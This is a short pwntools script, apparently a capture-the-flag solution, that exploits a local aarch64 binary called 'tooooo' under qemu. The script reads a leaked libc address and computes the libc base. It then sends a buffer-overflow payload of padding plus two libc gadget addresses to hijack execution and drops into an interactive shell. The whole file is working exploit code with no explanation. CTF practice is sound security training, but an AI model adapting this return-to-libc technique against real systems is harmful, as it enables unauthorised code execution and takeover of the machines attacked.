from pwn import *
import sys, time


if __name__ == "__main__":
    #p = process("qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./tooooo".split(" "))
    p = process("qemu-aarch64-static -L ./ ./tooooo".split(" "))
    libc = ELF("./libc-2.27.so")
    stdout = int(p.recvline()[:-1], 0)
    libc_base = stdout - 0x154560
    print hex(stdout)
    print hex(libc_base)
    
    payload = "A" * 0x20
    payload += p64(libc_base + 0x110700)
    payload += p64(libc_base + 0x63e90)
    p.send(payload)

    p.interactive()
